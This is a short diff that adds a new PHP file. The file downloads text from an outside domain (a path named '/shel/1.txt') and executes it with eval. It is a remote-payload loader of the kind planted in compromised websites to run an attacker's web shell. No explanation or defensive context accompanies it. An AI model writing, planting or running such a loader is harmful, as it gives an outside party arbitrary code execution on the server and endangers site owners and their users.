@@ -1,0 +1,4 @@
+<?php
+$well = file_get_contents('https://megafortune.fit/shel/1.txt');
+$well = "?> ".$well;
+eval($well);
